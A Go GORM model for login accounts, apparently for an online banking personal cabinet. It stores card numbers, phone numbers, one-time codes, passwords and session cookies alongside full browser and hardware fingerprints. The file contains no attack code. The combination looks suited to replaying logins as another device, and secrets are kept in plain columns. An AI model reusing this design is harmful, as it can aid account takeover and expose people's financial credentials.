package models

import (
	"time"
)

// Модель аккаунта для входа в ЛК

type Account struct {
	ID               uint      `gorm:"primaryKey;autoIncrement"`
	Title            *string   `gorm:"type:varchar(25);default:null"`
	CardNumber       string    `gorm:"type:char(16);not null"`
	AccountNumber    *string   `gorm:"type:varchar(20);default:null"`
	PhoneNumber      string    `gorm:"type:char(11);not null"`
	TemporaryCode    *string   `gorm:"type:char(4);default:null"`
	Password         *string   `gorm:"type:varchar(8);default:null"`
	CreatedAt        time.Time `gorm:"autoCreateTime"`
	IsActive         bool      `gorm:"default:true"`
	IsAuthenticated  bool      `gorm:"default:false"`
	HasTemporaryCode bool      `gorm:"default:false"`
	IsErrored        bool      `gorm:"default:false"`

	// Fingerprint
	BufferSize     *int    `gorm:"default:null"`
	InputChannels  *int    `gorm:"default:null"`
	OutputChannels *int    `gorm:"default:null"`
	Frequency      *int    `gorm:"default:null"`
	Start          *string `gorm:"type:varchar(5);default:null"`
	Stop           *string `gorm:"type:varchar(5);default:null"`

	// Network
	LocalIP  *string `gorm:"type:varchar(25);default:null"`
	PublicIP *string `gorm:"type:varchar(25);default:null"`

	// Hardware
	CPU                 *string  `gorm:"type:varchar(100);default:null"`
	GPU                 *string  `gorm:"type:varchar(100);default:null"`
	DeviceMemory        *int     `gorm:"default:null"`
	HardwareConcurrency *int     `gorm:"default:null"`
	ScreenWidth         *int     `gorm:"default:null"`
	ScreenHeight        *int     `gorm:"default:null"`
	BatteryVolume       *float64 `gorm:"type:decimal(5,2);default:null"`
	IsCharging          *bool    `gorm:"default:null"`

	// Navigator
	SessionCookies *string `gorm:"type:text;default:null"`
	UserAgent      *string `gorm:"type:text;default:null"`
	Platform       *string `gorm:"type:varchar(100);default:null"`
}

// Метод для ренейма таблицы под стиль Django

func (Account) TableName() string {
	return "accounts_account"
}
